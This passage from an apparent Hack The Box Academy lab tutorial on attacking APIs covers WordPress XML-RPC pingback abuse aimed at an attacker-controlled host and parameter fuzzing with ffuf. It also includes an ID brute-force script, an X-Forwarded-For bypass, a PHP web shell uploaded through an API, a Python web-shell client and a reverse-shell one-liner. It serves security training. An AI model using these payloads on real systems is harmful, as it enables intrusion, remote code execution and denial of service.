+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.deleteTerm<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.editTerm<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.newTerm<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPosts<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.deletePost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.editPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.newPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodResponse</span>&gt;</span>
+</code></pre>
+<p>Inside the list of available methods above, <a href="https://codex.wordpress.org/XML-RPC\_Pingback\_API">pingback.ping</a> is included. <code>pingback.ping</code> allows for XML-RPC pingbacks. According to WordPress, <em>a</em> <a href="https://wordpress.com/support/comments/pingbacks/"><em>pingback</em></a> <em>is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.</em></p>
+<p>Unfortunately, if pingbacks are available, they can facilitate:</p>
+<ul>
+<li>IP Disclosure - An attacker can call the <code>pingback.ping</code> method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.</li>
+<li>Cross-Site Port Attack (XSPA) - An attacker can call the <code>pingback.ping</code> method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.</li>
+<li>Distributed Denial of Service Attack (DDoS) - An attacker can call the <code>pingback.ping</code> method on numerous WordPress instances against a single target.</li>
+</ul>
+<p>Find below how an IP Disclosure attack could be mounted if <code>xmlrpc.php</code> is enabled and the <code>pingback.ping</code> method is available. XSPA and DDoS attacks can be mounted similarly.</p>
+<p>Suppose that the WordPress instance residing in <em><a href="http://blog.inlanefreight.com">http://blog.inlanefreight.com</a></em> is protected by Cloudflare. As we already identified, it also has <code>xmlrpc.php</code> enabled, and the <code>pingback.ping</code> method is available.</p>
+<p>As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from <em><a href="http://blog.inlanefreight.com">http://blog.inlanefreight.com</a></em>, verifying the pingback and exposing <em><a href="http://blog.inlanefreight.com">http://blog.inlanefreight.com</a></em>'s public IP address.</p>
+<pre><code class="lang-http">--&gt; POST /xmlrpc.php HTTP/1.1 
+Host: blog.inlanefreight.com 
+Connection: keep-alive 
+Content-Length: 293
+
+<span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>pingback.ping<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://attacker-controlled-host.com/<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>
+</code></pre>
+<p>If you have access to our <a href="https://academy.hackthebox.com/module/details/17">Hacking Wordpress</a> module, please note that you won't be able to exploit the availability of the <code>pingback.ping</code> method against the related section's target, due to egress restrictions.</p>
+<h2 id="information-disclosure-with-a-twist-of-sqli-">Information Disclosure (with a twist of SQLi)</h2>
+<hr>
+<p>As already discussed, security-related inefficiencies or misconfigurations in a web service or API can result in information disclosure.</p>
+<p>When assessing a web service or API for information disclosure, we should spend considerable time on fuzzing.</p>
+<hr>
+<h3 id="information-disclosure-through-fuzzing">Information Disclosure through Fuzzing</h3>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.</p>
+<p>Suppose we are assessing an API residing in <code>http://&lt;TARGET IP&gt;:3003</code>.</p>
+<p>Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using <em>ffuf</em> and the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt">burp-parameter-names.txt</a> list, as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u <span class="hljs-emphasis">'http://&lt;TARGET IP&gt;:3003/?FUZZ=test_value'</span>
+
+<span class="hljs-code">        /'___\  /'___\           /'___\       </span>
+<span class="hljs-code">       /\ \__/ /\ \__/  __  __  /\ \__/       </span>
+<span class="hljs-code">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span>
+<span class="hljs-code">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span>
+<span class="hljs-code">         \ \_\   \ \_\  \ \____/  \ \_\       </span>
+<span class="hljs-code">          \/_/    \/_/   \/___/    \/_/       </span>
+
+<span class="hljs-code">       v1.3.1 Kali Exclusive &lt;3</span>
+<span class="hljs-quote">________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://&lt;TARGET IP&gt;:3003/?FUZZ=test_value
+ :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________</span>
+
+<span class="hljs-meta">:: Progress:</span> [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorpassword                [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorurl                     [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [41/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorc                       [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [42/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorid                      [Status: 200, Size: 38, Words: 7, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [43/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erroremail                   [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [44/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errortype                    [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [45/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorusername                [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [46/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorq                       [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [47/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errortitle                   [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [48/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errordata                    [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [49/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errordescription             [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [50/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorfile                    [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [51/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errormode                    [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [52/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors                       [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [53/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errororder                   [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [54/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorcode                    [Status: 200, Size: 19, Words: 4, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [55/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errorlang                    [Status: 200, Size: 19, Words: 4, Lines: 1]
+</code></pre>
+<p>We notice a similar response size in every request. This is because supplying any parameter will return the same text, not an error like 404.</p>
+<p>Let us filter out any responses having a size of 19, as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u <span class="hljs-emphasis">'http://&lt;TARGET IP&gt;:3003/?FUZZ=test_value'</span> -fs 19
+
+
+<span class="hljs-code">        /'___\  /'___\           /'___\       </span>
+<span class="hljs-code">       /\ \__/ /\ \__/  __  __  /\ \__/       </span>
+<span class="hljs-code">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span>
+<span class="hljs-code">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span>
+<span class="hljs-code">         \ \_\   \ \_\  \ \____/  \ \_\       </span>
+<span class="hljs-code">          \/_/    \/_/   \/___/    \/_/       </span>
+
+<span class="hljs-code">       v1.3.1 Kali Exclusive &lt;3</span>
+<span class="hljs-quote">________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://&lt;TARGET IP&gt;:3003/?FUZZ=test_value
+ :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 19
+________________________________________________</span>
+
+<span class="hljs-meta">:: Progress:</span> [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 id                      [Status: 200, Size: 38, Words: 7, Lines: 1]
+<span class="hljs-meta">:: Progress:</span> [57/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 
+<span class="hljs-meta">:: Progress:</span> [187/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
+<span class="hljs-meta">:: Progress:</span> [375/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
+<span class="hljs-meta">:: Progress:</span> [567/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
+<span class="hljs-meta">:: Progress:</span> [755/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
+<span class="hljs-meta">:: Progress:</span> [952/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0
+<span class="hljs-meta">:: Progress:</span> [1160/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 
+<span class="hljs-meta">:: Progress:</span> [1368/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 
+<span class="hljs-meta">:: Progress:</span> [1573/2588] :: Job [1/1] :: 1720 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [1752/2588] :: Job [1/1] :: 1437 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [1947/2588] :: Job [1/1] :: 1625 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [2170/2588] :: Job [1/1] :: 1777 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [2356/2588] :: Job [1/1] :: 1435 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [2567/2588] :: Job [1/1] :: 2103 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [2588/2588] :: Job [1/1] :: 2120 req/sec :: Duration: [0:00:01] :: Error
+<span class="hljs-meta">:: Progress:</span> [2588/2588] :: Job [1/1] :: 2120 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+</code></pre>
+<p>It looks like <em>id</em> is a valid parameter. Let us check the response when specifying <em>id</em> as a parameter and a test value.</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3003/</span>?id=<span class="hljs-number">1</span>
+[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"admin"</span>,<span class="hljs-string">"position"</span>:<span class="hljs-string">"1"</span>}]
+</code></pre>
+<p>Find below a Python script that could automate retrieving all information that the API returns (save it as <code>brute_api.py</code>).</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests, sys
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">try</span>:
+        value = range(<span class="hljs-number">10000</span>)
+        <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> value:
+            url = sys.argv[<span class="hljs-number">1</span>]
+            r = requests.get(url + <span class="hljs-string">'/?id='</span>+str(val))
+            <span class="hljs-keyword">if</span> <span class="hljs-string">"position"</span> <span class="hljs-keyword">in</span> r.text:
+                print(<span class="hljs-string">"Number found!"</span>, val)
+                print(r.text)
+    <span class="hljs-keyword">except</span> IndexError:
+        print(<span class="hljs-string">"Enter a URL E.g.: http://&lt;TARGET IP&gt;:3003/"</span>)
+
+brute()
+</code></pre>
+<ul>
+<li>We import two modules <em>requests</em> and <em>sys</em>. <em>requests</em> allows us to make HTTP requests (GET, POST, etc.), and <em>sys</em> allows us to parse system arguments.</li>
+<li>We define a function called <em>brute</em>, and then we define a variable called <em>value</em> which has a range of <em>10000</em>. <em>try</em> and <em>except</em> help in exception handling.</li>
+<li><em>url = sys.argv[1]</em> receives the first argument.</li>
+<li><em>r = requests.get(url + '/?id='+str(val))</em> creates a response object called <em>r</em> which will allow us to get the response of our GET request. We are just appending <em>/?id=</em> to our request and then <em>val</em> follows, which will have a value in the specified range.</li>
+<li><em>if "position" in r.text:</em> looks for the <em>position</em> string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return <em>[]</em>.</li>
+</ul>
+<p>The above script can be run, as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 brute_api.py http://&lt;<span class="hljs-symbol">TARGET</span> <span class="hljs-symbol">IP</span>&gt;:<span class="hljs-number">3003</span>
+<span class="hljs-symbol">Number</span> found! <span class="hljs-number">1</span>
+[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"admin"</span>,<span class="hljs-string">"position"</span>:<span class="hljs-string">"1"</span>}]
+<span class="hljs-symbol">Number</span> found! <span class="hljs-number">2</span>
+[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"2"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"HTB-User-John"</span>,<span class="hljs-string">"position"</span>:<span class="hljs-string">"2"</span>}]
+...
+</code></pre>
+<p>Now you can proceed to the end of this section and answer the first question!</p>
+<p><strong>TIP</strong>: If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
+$whitelist = <span class="hljs-keyword">array</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-string">"1.3.3.7"</span>);
+<span class="hljs-keyword">if</span>(!(in_array($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>], $whitelist)))
+{
+    header(<span class="hljs-string">"HTTP/1.1 401 Unauthorized"</span>);
+}
+<span class="hljs-keyword">else</span>
+{
+  <span class="hljs-keyword">print</span>(<span class="hljs-string">"Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!"</span>);
+}</span>
+</code></pre>
+<p>The issue here is that the code compares the _HTTP_X_FORWARDED_FOR_ header to the possible <em>whitelist</em> values, and if the _HTTP_X_FORWARDED_FOR_ is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the <em>X-Forwarded-For</em> header and the value to one of the IPs from the array.</p>
+<hr>
+<h3 id="information-disclosure-through-sql-injection">Information Disclosure through SQL Injection</h3>
+<p>SQL injection vulnerabilities can affect APIs as well. That <em>id</em> parameter looks interesting. Try submitting classic SQLi payloads and answer the second question.</p>
+<h2 id="arbitrary-file-upload">Arbitrary File Upload</h2>
+<hr>
+<p>Arbitrary file uploads are among the most critical vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server. Arbitrary file upload vulnerabilities affect web applications and APIs alike.</p>
+<hr>
+<h3 id="php-file-upload-via-api-to-rce">PHP File Upload via API to RCE</h3>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.</p>
+<p>Suppose we are assessing an application residing in <code>http://&lt;TARGET IP&gt;:3001</code>.</p>
+<p>When we browse the application, an anonymous file uploading functionality sticks out. <img src="storage\modules\160\2.png" alt="image"></p>
+<p>Let us create the below file (save it as <code>backdoor.php</code>) and try to upload it via the available functionality.</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'cmd'</span>])){ $cmd = ($_REQUEST[<span class="hljs-string">'cmd'</span>]); system($cmd); <span class="hljs-keyword">die</span>; }<span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>The above allows us to append the parameter <em>cmd</em> to our request (to backdoor.php), which will be executed using <em>system()</em>. This is if we can determine <em>backdoor.php</em>'s location, if <em>backdoor.php</em> will be rendered successfully and if no PHP function restrictions exist.</p>
+<p><img src="storage\modules\160\4.png" alt="image"></p>
+<ul>
+<li><em>backdoor.php</em> was successfully uploaded via a POST request to <code>/api/upload/</code>. An API seems to be handling the file uploading functionality of the application.</li>
+<li>The content type has been automatically set to <code>application/x-php</code>, which means there is no protection in place. The content type would probably be set to <code>application/octet-stream</code> or <code>text/plain</code> if there was one.</li>
+<li>Uploading a file with a <em>.php</em> extension is also allowed. If there was a limitation on the extensions, we could try extensions such as <code>.jpg.php</code>, <code>.PHP</code>, etc.</li>
+<li>Using something like <a href="https://www.php.net/manual/en/function.file-get-contents.php">file_get_contents()</a> to identify php code being uploaded seems not in place either.</li>
+<li>We also receive the location where our file is stored, <code>http://&lt;TARGET IP&gt;:3001/uploads/backdoor.php</code>.</li>
+</ul>
+<p>We can use the below Python script (save it as <code>web_shell.py</code>) to obtain a shell, leveraging the uploaded <code>backdoor.php</code> file.</p>
+<pre><code class="lang-python">import argparse, <span class="hljs-built_in">time</span>, requests, os # imports four modules argparse (used <span class="hljs-keyword">for</span> <span class="hljs-built_in">system</span> arguments), <span class="hljs-built_in">time</span> (used <span class="hljs-keyword">for</span> <span class="hljs-built_in">time</span>), requests (used <span class="hljs-keyword">for</span> HTTP/HTTPs Requests), os (used <span class="hljs-keyword">for</span> operating <span class="hljs-built_in">system</span> commands)
+parser = argparse.ArgumentParser(description=<span class="hljs-string">"Interactive Web Shell for PoCs"</span>) # generates a variable called parser <span class="hljs-keyword">and</span> uses argparse to create a description
+parser.add_argument(<span class="hljs-string">"-t"</span>, <span class="hljs-string">"--target"</span>, help=<span class="hljs-string">"Specify the target host E.g. http://&lt;TARGET IP&gt;:3001/uploads/backdoor.php"</span>, required=True) # specifies flags such as -t <span class="hljs-keyword">for</span> a target with a help <span class="hljs-keyword">and</span> required option being <span class="hljs-literal">true</span>
+parser.add_argument(<span class="hljs-string">"-p"</span>, <span class="hljs-string">"--payload"</span>, help=<span class="hljs-string">"Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload"</span>) # similar to above
+parser.add_argument(<span class="hljs-string">"-o"</span>, <span class="hljs-string">"--option"</span>, help=<span class="hljs-string">"Interactive Web Shell with loop usage: python3 web_shell.py -t http://&lt;TARGET IP&gt;:3001/uploads/backdoor.php -o yes"</span>) # similar to above
+<span class="hljs-built_in">args</span> = parser.parse_args() # defines <span class="hljs-built_in">args</span> as a variable holding the <span class="hljs-built_in">values</span> of the above arguments so we can <span class="hljs-keyword">do</span> <span class="hljs-built_in">args</span>.option <span class="hljs-keyword">for</span> <span class="hljs-built_in">example</span>.
+<span class="hljs-keyword">if</span> <span class="hljs-built_in">args</span>.target == None <span class="hljs-keyword">and</span> <span class="hljs-built_in">args</span>.payload == None: # checks <span class="hljs-keyword">if</span> <span class="hljs-built_in">args</span>.target (the url of the target) <span class="hljs-keyword">and</span> the payload <span class="hljs-built_in">is</span> blank <span class="hljs-keyword">if</span> so it'll <span class="hljs-built_in">show</span> the help menu
+    parser.print_help() # shows help menu
+elif <span class="hljs-built_in">args</span>.target <span class="hljs-keyword">and</span> <span class="hljs-built_in">args</span>.payload: # elif (<span class="hljs-keyword">if</span> they both have <span class="hljs-built_in">values</span> <span class="hljs-keyword">do</span> <span class="hljs-built_in">some</span> action)
+    <span class="hljs-built_in">print</span>(requests.<span class="hljs-built_in">get</span>(<span class="hljs-built_in">args</span>.target+<span class="hljs-string">"/?cmd="</span>+<span class="hljs-built_in">args</span>.payload).text) ## sends the request with a GET <span class="hljs-built_in">method</span> with the targets URL appends the /?cmd= param <span class="hljs-keyword">and</span> the payload <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> prints out the value using .text because we're already sending it within the <span class="hljs-built_in">print</span>() function
+<span class="hljs-keyword">if</span> <span class="hljs-built_in">args</span>.target <span class="hljs-keyword">and</span> <span class="hljs-built_in">args</span>.option == <span class="hljs-string">"yes"</span>: # <span class="hljs-keyword">if</span> the target option <span class="hljs-built_in">is</span> set <span class="hljs-keyword">and</span> <span class="hljs-built_in">args</span>.option <span class="hljs-built_in">is</span> set to yes (<span class="hljs-keyword">for</span> a full interactive shell)
+    os.<span class="hljs-built_in">system</span>(<span class="hljs-string">"clear"</span>) # clear the screen (linux)
+    <span class="hljs-keyword">while</span> True: # starts a <span class="hljs-keyword">while</span> loop (never ending loop)
+        try: # try statement
+            cmd = input(<span class="hljs-string">"$ "</span>) # defines a cmd variable <span class="hljs-keyword">for</span> an input() function which our user will enter
+            <span class="hljs-built_in">print</span>(requests.<span class="hljs-built_in">get</span>(<span class="hljs-built_in">args</span>.target+<span class="hljs-string">"/?cmd="</span>+cmd).text) # same as above except with our input() function value
+            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.3</span>) # waits <span class="hljs-number">0.3</span> seconds during each request
+        except requests.exceptions.InvalidSchema: # <span class="hljs-built_in">error</span> handling
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Invalid URL Schema: http:// or https://"</span>)
+        except requests.exceptions.ConnectionError: # <span class="hljs-built_in">error</span> handling
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">"URL is invalid"</span>)
+</code></pre>
+<p>Use the script as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ pytho<span class="hljs-symbol">n3</span> web_shell.py -t http:<span class="hljs-comment">//&lt;TARGET IP&gt;:3001/uploads/backdoor.php -o yes</span>
+$ id
+uid=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span> gid=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span> groups=<span class="hljs-number">0</span><span class="hljs-comment">(root)</span>
+</code></pre>
+<p>To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 web_shell.py -t http://<span class="hljs-variable">&lt;TARGET IP&gt;</span>:<span class="hljs-number">3001</span>/uploads/backdoor.php -o yes
+$ python3 -c 'import socket,subprocess,<span class="hljs-keyword">os</span>;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"&lt;VPN/TUN Adapter IP&gt;"</span>,<span class="hljs-variable">&lt;LISTENER PORT&gt;</span>));<span class="hljs-keyword">os</span>.dup2(s.fileno(),<span class="hljs-number">0</span>); <span class="hljs-keyword">os</span>.dup2(s.fileno(),<span class="hljs-number">1</span>);<span class="hljs-keyword">os</span>.dup2(s.fileno(),<span class="hljs-number">2</span>);import pty; pty.spawn(<span class="hljs-string">"sh"</span>)'
+</code></pre>
+<h2 id="local-file-inclusion-lfi-">Local File Inclusion (LFI)</h2>
+<hr>
+<p>Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being <code>Apache Log Poisoning</code>. Our <a href="https://academy.hackthebox.com/module/details/23">File Inclusion</a> module covers LFI in detail.</p>
+<p>Let us assess together an API that is vulnerable to Local File Inclusion.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.</p>
+<p>Suppose we are assessing such an API residing in <code>http://&lt;TARGET IP&gt;:3000/api</code>.</p>
+<p>Let us first interact with it.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3000/api</span>
+{<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"UP"</span></span>}
+</code></pre>
+<p>We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using <em>ffuf</em> and the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt">common-api-endpoints-mazen160.txt</a> list, as follows.</p>
